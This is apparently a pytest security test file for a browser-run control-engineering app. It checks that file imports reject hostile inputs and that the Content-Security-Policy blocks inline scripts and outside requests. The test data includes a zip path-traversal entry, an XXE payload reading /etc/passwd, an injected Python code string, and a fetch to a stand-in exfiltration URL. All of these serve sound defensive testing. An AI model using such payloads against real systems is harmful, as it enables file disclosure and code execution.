"""Collect the existing real offline proof plus browser CSP and passive imports."""

import importlib.util
from pathlib import Path

import pytest
from scripts.browser_harness import browser_harness

# Preserve and collect the previously audited test without changing its oracle.
_spec = importlib.util.spec_from_file_location(
    "f9_offline_browser", Path(__file__).with_name("offline_browser.py")
)
_module = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_module)
test_offline_real_calculation_after_reload = _module.test_offline_real_calculation_after_reload


def test_passive_zip_fml_pvm_in_pyodide(browser_harness):
    report = browser_harness.python("""import io, zipfile, json, builtins, numpy as np
from control_lab.io.ctrlab import load_ctrlab
from control_lab.io.pvm import import_pvm
from control_lab.fuzzy.fml import import_fml
buf=io.BytesIO()
with zipfile.ZipFile(buf,'w') as z:z.writestr('../outside.txt','forbidden')
results={}
for name,fn,arg in [('zip',load_ctrlab,buf.getvalue()),('fml',import_fml,'<!DOCTYPE x [<!ENTITY z SYSTEM "file:///etc/passwd">]><fuzzySystem name="&z;"/>')]:
    try:
        value=fn(arg)
        results[name]={'status':value.status,'error':value.error.to_dict() if value.error else None}
    except Exception as e:results[name]={'exception':type(e).__name__,'message':str(e)}
from control_lab.core import StateSpace, StateFeedbackController
from control_lab.io.pvm import export_pvm
plant=StateSpace([[0.,1.],[0.,0.]],[[0.],[1.]],np.eye(2),np.zeros((2,1)))
controller=StateFeedbackController([[2.,3.]],feedback_sign="negative")
pvm=export_pvm(plant,controller).data['pvm']
pvm['codeContext']={'code':'__import__("builtins").F9_EXECUTED=True'}
try:
    value=import_pvm(json.dumps(pvm));results['pvm']={'status':value.status}
except Exception as e:results['pvm']={'exception':type(e).__name__,'message':str(e)}
results['executed']=hasattr(builtins,'F9_EXECUTED')
json.dumps(results)""")
    assert not report["executed"]
    assert (
        report["zip"]["status"] == "failure"
        and report["zip"]["error"]["code"] == "VALIDATION_ERROR"
    ), report
    assert (
        report["fml"]["status"] == "failure"
        and report["fml"]["error"]["code"] == "IMPORT_UNTRUSTED_CODE"
    ), report
    assert report["pvm"]["status"] in ("success", "warning"), report
    browser_harness.record("passive-imports", report)


def test_shipped_csp_blocks_inline_and_external_without_breaking_runtime(browser_harness):
    page = browser_harness.page.context.new_page()
    try:
        page.goto(browser_harness.origin + "/")
        page.wait_for_function(
            "() => document.querySelector('#engine-status-badge')?.textContent.includes('Motor: ready')"
        )
        page.locator('[data-action="commit-lqr"]').click()
        page.wait_for_function(
            "() => document.querySelector('#lqr-k-display pre[aria-label=\"Matriz de ganho K\"]') !== null && document.querySelector('#lqr-status-text')?.textContent === 'Confirmado'"
        )
        result = page.evaluate("""async () => {
            globalThis.inlineRan=false; const violations=[];
            document.addEventListener("securitypolicyviolation", event=>violations.push(event.effectiveDirective));
            const script=document.createElement('script');script.textContent='globalThis.inlineRan=true';document.body.append(script);
            const csp=document.querySelector('meta[http-equiv="Content-Security-Policy"]').content;
            let blocked=false;try{await fetch('https://example.invalid/exfiltrate')}catch{blocked=true}
            await new Promise(resolve=>setTimeout(resolve,30));
            return {csp,inlineRan,blocked,violations,badge:document.querySelector('#engine-status-badge').textContent};
        }""")
        assert not result["inlineRan"] and result["blocked"]
        assert "connect-src" in result["violations"]
        assert any(name.startswith("script-src") for name in result["violations"])
        assert "connect-src 'self'" in result["csp"]
        browser_harness.record("csp-real-browser", result)
    finally:
        page.close()
